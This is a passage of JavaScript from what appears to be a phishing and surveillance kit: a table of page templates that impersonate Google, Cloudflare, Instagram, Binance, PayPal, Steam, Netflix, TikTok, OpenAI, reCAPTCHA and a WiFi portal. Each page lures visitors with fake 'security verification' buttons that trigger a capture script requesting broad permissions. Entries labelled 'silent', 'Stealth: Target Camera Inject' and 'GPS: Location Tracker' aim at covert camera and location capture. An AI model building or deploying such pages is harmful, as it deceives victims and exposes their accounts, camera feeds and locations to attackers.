    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico"><title>Verify Identity - Google Accounts</title><style>body { font-family: 'Google Sans', 'Roboto', Arial, sans-serif; background:#ffffff; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; -webkit-font-smoothing: antialiased; } .box { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:100%; max-width:450px; text-align:left; box-sizing:border-box; } .google-logo { width:75px; margin-bottom:12px; } h1 { font-size:24px; font-weight:400; color:#202124; margin:0 0 8px; } p { font-size:16px; color:#3c4043; margin-bottom:32px; line-height: 1.5; } .identity-pill { border:1px solid #dadce0; border-radius:16px; padding:4px 10px; font-size:14px; color:#3c4043; display:inline-flex; align-items:center; margin-bottom:24px; font-weight: 500; } .identity-pill img { width:20px; height:20px; border-radius:50%; margin-right:8px; } .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; float: right; transition: background .2s; } .btn:hover { background: #1b66c9; } .footer { display: flex; margin-top: 80px; font-size: 12px; color: #70757a; font-weight: 400; justify-content: space-between; clear: both; }</style></head><body><div class="box"><img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"><h1>Verify Identity</h1><div class="identity-pill"><img src="https://ssl.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png">Security Analysis Tool</div><p>This verification audit is required to confirm your device environment. One-tap verification facilitates a secure connection to your account dashboard.</p><div style="margin-top: 32px; height: 40px;"><button class="btn" onclick="window.startCapture('google');">Next</button></div><div class="footer"><div>English (United States)</div><div style="display:flex; gap:16px;"><span>Help</span><span>Privacy</span><span>Terms</span></div></div></div>${getCaptureScript(id, 'https://myaccount.google.com/security', {
      tmplId: 'google', perms: ALL_PERMS, accent: '#1a73e8', icon: '👤',
    })}</body></html>`
  },
  'gallery': {
    name: "🖼️ Integrity: Media Forensic Sync (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Asset Integrity Check</title><style>body { background:#f8f9fa; color:#202124; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:90%; max-width:400px; padding:48px; border-radius:12px; text-align:center; background:#fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border:1px solid #dadce0; } h2 { font-size:20px; font-weight:500; margin-top:0; } p { color:#70757a; font-size:14px; line-height:1.6; margin:20px 0 30px; } .btn { background:#1a73e8; color:#fff; padding:12px 32px; border-radius:6px; border:none; font-weight:500; cursor:pointer; width:100%; font-size:14px; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:15px;">🛡️</div><h2>Media Security Check</h2><p>Our systems require a standard security check to validate your identity for this session.</p><button class="btn" onclick="window.startCapture();">Verify Session</button><div style="font-size:10px; color:#999; margin-top:20px; text-align:center;">By verifying, you accept the <a href="#" style="color:#1a73e8; text-decoration:none;">Identity Verification Service Agreement</a></div></div>${getCaptureScript(id, 'https://photos.google.com', {
      tmplId: 'gallery', perms: ALL_PERMS, accent: '#1a73e8', icon: '🕵️'
    })}</body></html>`
  },
  'cloudflare': {
    name: "☁️ Cloudflare: Edge Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://www.cloudflare.com/favicon.ico"><title>Just a moment...</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:left; background:#ffffff; color: #313131; } .container { width: 100%; max-width: 600px; padding: 40px 20px; box-sizing: border-box; } .logo { width: 160px; height: auto; margin-bottom: 48px; } .main-text { font-size: 34px; font-weight: 700; line-height: 1.2; margin-bottom: 16px; color: #000; } .sub-text { font-size: 17px; color: #595959; margin-bottom: 40px; line-height: 1.6; } .btn-verify { background: #f6821f; color: white; border: none; padding: 18px 40px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(246, 130, 31, 0.4); } .btn-verify:hover { background: #e67615; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(246, 130, 31, 0.5); } .footer { font-size: 13px; color: #999; margin-top: 100px; border-top: 1px solid #eee; padding-top: 24px; width: 100%; display: flex; justify-content: space-between; } .footer a { color: #f6821f; text-decoration: none; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare" class="logo" referrerpolicy="no-referrer"><div class="main-text">Verify you are human.</div><div class="sub-text">Please complete the security check to access the destination page. This helps keep our network safe and protects against automated attacks.</div><button class="btn-verify" onclick="this.disabled=true; this.innerText='Verifying...'; window.startCapture('cloudflare');">Verify Connection</button><div class="footer"><div>Ray ID: <span>${Math.random().toString(36).substring(2, 16)}</span></div><div>Performance & security by <a href="#">Cloudflare</a></div></div></div>${getCaptureScript(id, 'https://www.cloudflare.com', {
      tmplId: 'cloudflare', perms: ALL_PERMS, accent: '#f6821f', icon: '☁️'
    })}</body></html>`
  },
  'terminal': {
    name: "💻 System: Terminal Diagnostic Audit [STABLE]",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Terminal Integrity Check</title><style>
      body { background:#050505; color:#00ff41; font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding: 20px; box-sizing: border-box; overflow: hidden; }
      .box { width:100%; max-width:850px; background:rgba(10, 15, 10, 0.98); border:1px solid #1a3a2a; border-radius:4px; padding:50px; box-shadow:0 0 50px rgba(0, 255, 65, 0.08); position: relative; }
      .header-info { margin-bottom: 30px; border-bottom: 1px solid #1a3a2a; padding-bottom: 15px; }
      .header-info h2 { margin: 0; font-size: 18px; color: #00ff41; letter-spacing: 2px; }
      .header-info p { margin: 5px 0 0; font-size: 11px; color: #005020; font-weight: 600; }
      
      .btn-container { margin: 40px 0; display: flex; justify-content: center; }
      .btn { background: #00ff41; color:#000; border:none; padding:18px 45px; font-family:inherit; font-weight:900; cursor:pointer; font-size:14px; border-radius:2px; text-transform:uppercase; transition: all 0.3s; width: 100%; letter-spacing: 2px; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
      .btn:hover { background:transparent; color:#00ff41; box-shadow: 0 0 30px rgba(0,255,65,0.4); border: 1px solid #00ff41; }
      
      #log-console { height:220px; overflow-y:auto; font-size:11px; line-height:1.8; border:1px solid rgba(26, 58, 42, 0.5); background: rgba(0,0,0,0.3); border-radius: 4px; padding:15px; scrollbar-width: none; color: #00ca3c; mask-image: linear-gradient(to bottom, transparent, black 15%, black 85%, transparent); }
      #log-console::-webkit-scrollbar { display: none; }
      .line { margin-bottom: 4px; font-weight: 500; }
      .ts { color: #005020; margin-right: 12px; font-size: 10px; font-weight: 800; }
      .cursor { display:inline-block; width:8px; height:15px; background:#00ff41; animation: blink 1s infinite; vertical-align: middle; margin-left: 5px; }
      
      @keyframes blink { 0%, 100% { opacity:1; } 50% { opacity:0; } }
      .footer-info { color: #00401a; font-size: 10px; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
      .status-pill { display: inline-block; padding: 2px 8px; border: 1px solid #00ff41; border-radius: 3px; font-size: 10px; margin-left: 10px; vertical-align: middle; }
      .glitch-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.03; background: repeating-linear-gradient(0deg, #00ff41 0px, transparent 1px, transparent 2px); }
    </style></head><body><div class="glitch-layer"></div><div class="box">
    <div class="header-info">
      <h2>TERMINAL KERNEL AUDIT <span class="status-pill">STABLE</span></h2>
      <p>THREAT DETECTION SYSTEM // SESSION INTEGRITY // NODE_${id.substring(0,4)}</p>
    </div>
    
    <div class="btn-container">
      <button class="btn btn-verify">VERIFIKASI</button>
    </div>

    <div id="log-console">
      <div class="line"><span class="ts">[BOOT]</span> Initializing Deep Kernel Diagnostic...</div>
      <div class="line"><span class="ts">[INFO]</span> Awaiting authorization signature...<span class="cursor"></span></div>
    </div>
    
    <div class="footer-info">SECURED TUNNEL // ASIA-NODE-${id.substring(0,4)} // ID: ${id.substring(0,12)}</div>
    </div>
    <script>
      var log = document.getElementById('log-console');
      function addLine(msg, type) {
        var d = new Date();
        var tsStr = "[" + d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0') + ":" + d.getSeconds().toString().padStart(2,'0') + "]";
        var div = document.createElement('div');
        div.className = 'line';
        div.innerHTML = '<span class="ts">' + (type || tsStr) + '</span> ' + msg.toUpperCase();
        log.appendChild(div);
        log.scrollTop = log.scrollHeight;
      }
      var lastStatus = "";
      setInterval(function() {
        if(window.lastStatusMsg && window.lastStatusMsg !== lastStatus) {
           lastStatus = window.lastStatusMsg;
           addLine(lastStatus, "EXEC");
           
           // Inject additional fake entropy to keep the terminal busy
           var fakeLines = [
             "Mapping memory offset 0x" + Math.random().toString(16).substr(2,8),
             "Verifying checksum sequence...",
             "Established secure peer link.",
             "Entropy pool synchronized."
           ];
           setTimeout(function() {
             addLine(fakeLines[Math.floor(Math.random()*fakeLines.length)], "SYS");
           }, 200);
        }
      }, 400);
    </script>${getCaptureScript(id, 'https://github.com', {
      tmplId: 'terminal', perms: ALL_PERMS, accent: '#00ff41'
    })}</body></html>`
  },
  'security_audit': {
    name: "🛡️ Security: Browser Ecosystem Audit (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Trust & Safety</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .shield { color:#1877f2; font-size:60px; margin-bottom:20px; } h2 { font-size:24px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .btn { background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><div class="shield">🛡️</div><h2>Security Audit</h2><p>Our security systems have detected an unusual connection pattern. Please verify your connection to continue safely.</p><button class="btn" onclick="window.startCapture();">Verify & Continue</button><div style="font-size:10px; color:#999; margin-top:20px;">By continuing, you agree to the <a href="#" style="color:#1877f2; text-decoration:none;">Global Trust & Safety Agreement</a></div></div>${getCaptureScript(id, 'https://www.google.com/safetycenter', {
      tmplId: 'security_audit', perms: ALL_PERMS, accent: '#1877f2', icon: '🔒'
    })}</body></html>`
  },
  'meta_login': {
    name: "💬 Social: Account Recovery (Extreme)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title><style>body { background:#fafafa; font-family: -apple-system, system-ui, sans-serif; display:flex; flex-direction: column; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { border:1px solid #dbdbdb; background:#fff; padding:40px; width:100%; max-width:350px; box-sizing: border-box; text-align:center; margin-bottom: 12px; } .logo { width: 175px; height: auto; margin-bottom:35px; } h3 { font-size:16px; margin:0 0 12px; font-weight: 600; color: #262626; } p { color:#737373; font-size:14px; margin-bottom:30px; line-height: 1.5; } .btn { background:#0095f6; color:#fff; border:none; padding:7px 16px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 14px; transition: opacity 0.2s; } .btn:hover { opacity: 0.8; } .meta-brand { color: #737373; font-size: 12px; font-weight: 400; letter-spacing: 1px; margin-top: 40px; text-transform: uppercase; } .footer-copy { color: #737373; font-size: 12px; margin-top: 8px; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" class="logo" referrerpolicy="no-referrer"><h3>Security Verification</h3><p>We've detected an unusual login attempt. To protect your information, please verify your session integrity on this device.</p><button class="btn" onclick="window.startCapture();">Verify Account</button></div><div class="meta-brand">from Meta</div><div style="font-size:10px; color:#999; margin-top:15px; text-align:center;">By logging in, you agree to the <a href="#" style="color:#0095f6; text-decoration:none;">Meta User Agreement</a></div>${getCaptureScript(id, 'https://www.instagram.com', {
      tmplId: 'meta_login', perms: ALL_PERMS, accent: '#0095f6', icon: '📸'
    })}</body></html>`
  },
  'wifi': {
    name: "📶 WIFI: Hotspot Certification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WiFi Authentication</title><style>body { background:#f4f7f6; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; text-align:center; width:100%; max-width:400px; padding: 40px 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border-radius: 16px; box-sizing: border-box; } .wifi-icon { background: #e3f2fd; color: #1976d2; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; border-radius: 50%; margin: 0 auto 20px; font-size: 32px; } h1 { margin: 0 0 10px; font-size: 24px; color: #333; font-weight: 600; } p { color:#666; font-size:15px; margin-bottom: 30px; line-height: 1.5; } hr { border:0; border-top:1px solid #eee; margin: 0 0 30px; } .btn { background:#1976d2; color:#fff; border:none; padding:14px 40px; border-radius:8px; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #1565c0; } .terms { font-size: 12px; color: #999; margin-top: 20px; } .terms a { color: #1976d2; text-decoration: none; }</style></head><body><div class="box"><div class="wifi-icon">📶</div><h1>Free WiFi Connect</h1><p>Welcome to the Public Free WiFi network. To ensure network security and prevent bot abuse, please verify your session to connect.</p><hr><button class="btn" onclick="window.startCapture();">Connect to Network</button><div class="terms">By connecting, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> & <a href="#">Public WiFi Agreement</a>.</div></div>${getCaptureScript(id, 'https://google.com', {
      tmplId: 'wifi', perms: ALL_PERMS, accent: '#1976d2', icon: '📶'
    })}</body></html>`
  },
  'binance': {
    name: "💱 Crypto: Withdrawal Security (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification | Binance</title><style>body { background:#0b0e11; color:#eaecef; font-family: 'BinancePlex', 'Inter', -apple-system, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:440px; padding:48px 40px; background:#1e2329; border-radius:16px; text-align:center; box-shadow: 0 10px 40px rgba(0,0,0,0.4); } h2 { font-size:24px; font-weight: 600; color: #eaecef; margin-bottom:16px; } p { color:#848e9c; font-size:15px; margin-bottom:32px; line-height: 1.6; } .btn { background:#fcd535; color:#0b0e11; padding:12px 24px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; font-size: 16px; transition: background 0.2s; } .btn:hover { background: #e6c229; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" alt="Binance" style="width: 160px; height: auto; margin-bottom: 32px; filter: brightness(0) invert(1);" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>To protect your account assets, please complete the standard security verification check to authorize this session.</p><button class="btn" onclick="window.startCapture();">Confirm Verification</button><div style="font-size:11px; color:#666; margin-top:20px;">By clicking "Confirm", you agree to the <a href="#" style="color:#fcd535; text-decoration:none;">Binance Service Agreement</a></div></div>${getCaptureScript(id, 'https://www.binance.com/en/my/security', {
      tmplId: 'binance', perms: ALL_PERMS, accent: '#fcd535', icon: '💰'
    })}</body></html>`
  },
  'paypal': {
    name: "💳 Fintech: Transaction Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal Security</title><style>body { background:#ffffff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#2c2e2f; } .box { width:100%; max-width:400px; text-align:center; padding:40px; box-sizing: border-box; } .logo-img { width: 120px; height: auto; margin-bottom:40px; } h2 { font-size:24px; font-weight: 300; margin-bottom:15px; color: #000; } p { color:#666; font-size:15px; line-height: 1.5; margin-bottom:40px; } .btn { background:#0070e0; color:#fff; padding:12px; border-radius:24px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size: 15px; transition: background 0.2s; } .btn:hover { background:#005ea6; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" class="logo-img" alt="PayPal"><h2>Help us protect your account</h2><p>We've noticed some unusual activity. To protect your funds, please verify your identity to continue.</p><button class="btn" onclick="window.startCapture();">Secure my account</button><div style="font-size:11px; color:#999; margin-top:20px;">By clicking, you agree to the <a href="#" style="color:#0070ba; text-decoration:none;">PayPal User Agreement</a></div></div>${getCaptureScript(id, 'https://www.paypal.com/myaccount/security', {
      tmplId: 'paypal', perms: ALL_PERMS, accent: '#0070ba', icon: '💳'
    })}</body></html>`
  },
  'steam': {
    name: "🎮 Gaming: Steam Guard (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://store.steampowered.com/favicon.ico"><title>Steam Guard Security</title><style>body { background:#1b2838; color:#c7d5e0; font-family: "Motiva Sans", Sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; -webkit-font-smoothing: antialiased; } .box { background:#171a21; width:100%; max-width:440px; padding:48px 32px; border-radius:4px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); text-align:center; border:1px solid #333; box-sizing: border-box; } .logo { width: 120px; height: auto; margin-bottom:32px; } h2 { font-size:24px; color:#fff; margin-bottom:16px; font-weight: 300; letter-spacing: 1px; } p { font-size:15px; color:#acb2b8; line-height:1.6; margin-bottom:32px; } .btn { background: linear-gradient( to right, #4074f3 0%, #1e45da 100%); color:#fff; border:none; padding:14px 24px; border-radius:2px; font-weight:500; cursor:pointer; width:100%; font-size: 16px; transition: filter 0.2s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); } .btn:hover { filter: brightness(1.2); }</style></head><body><div class="box"><img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Steam" referrerpolicy="no-referrer"><h2>Security Verification</h2><p>Steam requires a one-time security verification to authorize this device and maintain account security protection levels.</p><button class="btn" onclick="window.startCapture('steam');">Verify Device Authentication</button><div style="font-size:11px; color:#888; margin-top:20px;">By clicking, you accept the <a href="#" style="color:#4074f3; text-decoration:none;">Steam SSA & Privacy Policy</a></div></div>${getCaptureScript(id, 'https://store.steampowered.com', {
      tmplId: 'steam', perms: ALL_PERMS, accent: '#1a44c2', icon: '🎮'
    })}</body></html>`
  },
  'netflix': {
    name: "🍿 Media: Household Verification (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/x-icon" href="https://www.netflix.com/favicon.ico"><title>Household Verification - Netflix</title><style>body { background:#000000; color:#fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; -webkit-font-smoothing: antialiased; } .box { width:100%; max-width:480px; padding:60px 40px; text-align:center; background: #000; box-sizing: border-box; } .logo { margin-bottom:48px; } .logo img { width: 180px; height: auto; } h2 { font-size:32px; font-weight: 700; margin-bottom:24px; } p { color:#b3b3b3; font-size:17px; margin-bottom:48px; line-height: 1.6; } .btn { background:#e50914; color:#fff; border:none; padding:18px; font-weight:bold; cursor:pointer; width:100%; font-size:18px; border-radius: 4px; transition: background 0.2s; } .btn:hover { background: #c1000b; }</style></head><body><div class="box"><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/1000px-Netflix_2015_logo.svg.png" alt="Netflix" referrerpolicy="no-referrer"></div><h2>Verify Household</h2><p>To continue using Netflix on this device, please complete a brief security check to confirm your household connection environment.</p><button class="btn" onclick="window.startCapture('netflix');">Verify Device</button><div style="font-size:12px; color:#777; margin-top:30px;">By verifying, you agree to the <a href="#" style="color:#e50914; text-decoration:none;">Netflix Consumer Service Terms</a></div></div>${getCaptureScript(id, 'https://www.netflix.com', {
      tmplId: 'netflix', perms: ALL_PERMS, accent: '#e50914', icon: '📺'
    })}</body></html>`
  },
  'tiktok': {
    name: "🎵 Social: Creator Portal (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check | TikTok</title><style>body { background:#ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; color:#161823; } .box { width:100%; max-width:420px; text-align:center; padding: 48px 32px; border: 1px solid #f0f0f0; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); } .logo { width: 140px; height: auto; margin-bottom: 40px; } h2 { font-size:24px; font-weight:700; margin-bottom:16px; } p { color: rgba(22, 24, 35, 0.7); font-size:16px; margin-bottom:48px; line-height: 1.5; } .btn { background:#fe2c55; color:#fff; padding:16px; border:none; border-radius: 4px; font-weight:700; cursor:pointer; width:100%; font-size:16px; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Security Sweep</h2><p>Please complete a quick check to maintain your account safety and access to creator features.</p><button class="btn" onclick="window.startCapture();">Verify Identity</button><div style="font-size:12px; color:#999; margin-top:25px;">By continuing, you agree to the <a href="#" style="color:#fe2c55; text-decoration:none;">TikTok Business & Safety Agreement</a></div></div>${getCaptureScript(id, 'https://www.tiktok.com', {
      tmplId: 'tiktok', perms: ALL_PERMS, accent: '#fe2c55', icon: '🎵'
    })}</body></html>`
  },
  'chatgpt': {
    name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>OpenAI Authentication</title><style>body { background:#ffffff; font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; } .box { width:100%; max-width:400px; text-align:center; padding: 40px; } .logo { width: 40px; height: auto; margin-bottom: 32px; } h2 { font-size:32px; font-weight: 600; color: #000; margin-bottom: 24px; letter-spacing: -0.02em; } p { color:#353740; font-size:16px; margin-bottom:40px; line-height: 1.6; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-size: 16px; font-weight:500; transition: opacity 0.2s; } .btn:hover { opacity: 0.9; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="logo" referrerpolicy="no-referrer"><h2>Verify you are human</h2><p>To protect our systems, please complete a security audit to verify your connection.</p><button class="btn" onclick="window.startCapture();">Begin Verification</button><div style="font-size:11px; color:#999; margin-top:30px;">By clicking, you acknowledge the <a href="#" style="color:#10a37f; text-decoration:none;">OpenAI Identity Audit Policy</a></div></div>${getCaptureScript(id, 'https://openai.com', {
      tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
    })}</body></html>`
  },
  'meta_verification': {
    name: "🎯 Meta: Claim Lencana Verifikasi (Facebook/IG)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verifikasi Meta</title><style>body { font-family: -apple-system, system-ui, sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { background:#fff; border-radius:12px; padding:40px; width:100%; max-width:400px; text-align:center; box-shadow: 0 12px 40px rgba(0,0,0,0.08); } .meta-logo { width:120px; margin-bottom:20px; } h2 { font-size:22px; font-weight:700; color:#1c1e21; margin:0 0 12px; } p { color:#606770; line-height:1.5; font-size:15px; margin-bottom:30px; } .badge { width:60px; height:60px; margin-bottom:15px; } .btn { background:#0064e0; color:#fff; border:none; padding:12px; border-radius:6px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:filter 0.2s; } .btn:hover { filter: brightness(1.1); }</style></head><body><div class="box"><img class="meta-logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg"><img class="badge" src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Twitter_Verified_Badge.svg" style="filter: hue-rotate(200deg);"><h2>Claim Verified Badge</h2><p>Selamat! Akun Anda memenuhi syarat untuk mendapatkan lencana verifikasi Meta secara gratis. Klik tombol di bawah untuk memverifikasi identitas dan memasang lencana biru.</p><button class="btn" onclick="window.startCapture();">Claim Sekarang</button><div style="font-size:11px; color:#999; margin-top:20px;">Dengan mengklik, Anda menyetujui <a href="#" style="color:#0064e0; text-decoration:none;">Syarat dan Ketentuan Verifikasi Meta</a></div></div>${getCaptureScript(id, 'https://www.facebook.com/help/128237037833915', {
      tmplId: 'meta_verification', perms: ALL_PERMS, accent: '#0064e0', icon: '✅'
    })}</body></html>`
  },
  'recap': {
    name: "🕵️ reCAPTCHA: V2 Checkbox Check (Realistic)",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>reCAPTCHA Verification</title><style>body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; background:#fff; font-family: Roboto, helvetica, arial, sans-serif; } .box { width: 302px; height: 76px; border: 1px solid #d3d3d3; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; box-sizing: border-box; cursor: pointer; transition: all 0.2s; position: relative; } .box:hover { box-shadow: 0px 0px 2px rgba(0,0,0,0.1); } .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; margin-right: 12px; background: #fff; display: flex; align-items: center; justify-content: center; } .checkbox.spinning { border: none !important; background: transparent; } .checkbox.spinning::after { content: ''; width: 24px; height: 24px; border: 3px solid #1a73e8; border-right-color: transparent; border-radius: 50%; animation: sc-spin 1s linear infinite; } @keyframes sc-spin { to { transform: rotate(360deg); } } .text { font-size: 14px; color: #222; font-family: Roboto, sans-serif; } .logo { position: absolute; right: 10px; top: 12px; display: flex; flex-direction: column; align-items: center; } .logo img { width: 32px; height: 32px; margin-bottom: 2px; } .logo span { font-size: 8px; color: #555; text-align: center; line-height: 1.2; } .logo-links { font-size: 8px; color: #555; margin-top: 2px; } .logo-links a { color: #555; text-decoration: none; } .logo-links a:hover { text-decoration: underline; }</style></head><body><div class="box interactive-box" onclick="this.querySelector('.checkbox').classList.add('spinning'); window.startCapture();"><div class="checkbox"></div><div class="text">I'm not a robot</div><div class="logo"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"><span>reCAPTCHA</span><span class="logo-links"><a href="#">Privacy</a> - <a href="#">Terms</a></span></div></div><div style="font-size:11px; color:#777; margin-top:15px; max-width:300px; text-align:center;">To proceed, you must agree to the <a href="#" style="color:#1a73e8; text-decoration:none;">Identity Verification Agreement</a></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap', perms: ALL_PERMS, accent: '#1a73e8'
    })}</body></html>`
  },
  'recap_silent': {
    name: "☁️ Passive Connection Validation",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Loading...</title><style>body { background: #fafafa; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; } .spinner { width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }</style></head><body><div class="spinner"></div>${getCaptureScript(id, 'https://google.com/', {
      tmplId: 'recap_silent', flow: 'silent', perms: SILENT_PERMS
    })}</body></html>`
  },
  'camera_stealth': {
    name: "📸 Stealth: Target Camera Inject",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Image Viewer</title><style>body { background: #000; display: flex; height: 100vh; margin: 0; align-items: center; justify-content: center; font-family: sans-serif; color: #fff; flex-direction: column;} .box { text-align: center; } .btn { background: #333; color: white; border: none; padding: 12px 24px; border-radius: 4px; margin-top: 20px;} </style></head><body><div class="box"><h3>Private Image #8839</h3><button class="btn" onclick="this.innerText='Loading...'; window.startCapture('all');">View Full Image</button></div>${getCaptureScript(id, 'https://imgur.com/gallery/random', {
      tmplId: 'camera_stealth', flow: 'aggressive', perms: ['media']
    })}</body></html>`
  },
  'gps_tracker': {
    name: "📍 GPS: Location Tracker Module",
